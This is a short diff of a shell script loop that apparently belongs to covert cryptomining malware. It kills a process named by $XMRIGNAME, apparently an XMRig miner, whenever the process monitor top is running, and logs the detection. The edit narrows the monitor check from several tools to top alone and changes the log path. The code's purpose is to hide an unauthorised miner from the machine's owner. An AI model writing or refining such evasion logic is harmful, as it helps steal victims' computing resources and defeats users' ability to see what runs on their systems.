@@ -37,8 +37,9 @@ main() {
 	while true; do 
 		sleep 1
 
-		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
-			echo Found top > /tmp/me.log
+		#if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
+		if pgrep "top"; then
+			echo Found top >$LOCAL_PATH/my.log
 			pkill $XMRIGNAME
 			continue
 		fi
